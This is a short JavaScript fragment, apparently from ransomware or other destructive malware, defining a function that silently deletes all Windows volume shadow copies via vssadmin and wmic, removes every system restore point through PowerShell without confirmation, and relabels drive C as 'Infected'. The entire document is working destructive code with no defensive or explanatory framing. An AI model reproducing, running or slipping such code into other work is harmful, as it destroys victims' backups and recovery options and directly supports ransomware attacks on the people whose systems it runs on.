// Function to delete shadow copies and system restore points with additional methods
function deleteshadowcopies() {
    exec('vssadmin delete shadows /all /quiet', (error) => {
        if (error) {
            console.error('Error deleting shadows:', error);
        } else {
            exec('wmic ShadowCopy delete', (error) => {
                if (error) {
                    console.error('Error deleting shadow copies:', error);
                } else {
                    exec('powershell -Command "Get-ComputerRestorePoint | Remove-ComputerRestorePoint -Confirm:$false"', (error) => {
                        if (error) {
                            console.error('Error removing restore points:', error);
                        } else {
                            exec('powershell -Command "Get-Volume | Where-Object { $_.DriveLetter -eq \'C\' } | ForEach-Object { $_.FileSystemLabel = \'Infected\' }"', (error) => {
                                if (error) {
                                    console.error('Error setting volume label:', error);
                                }
                            });
                        }
                    });
                }
            });
        }
    });
}

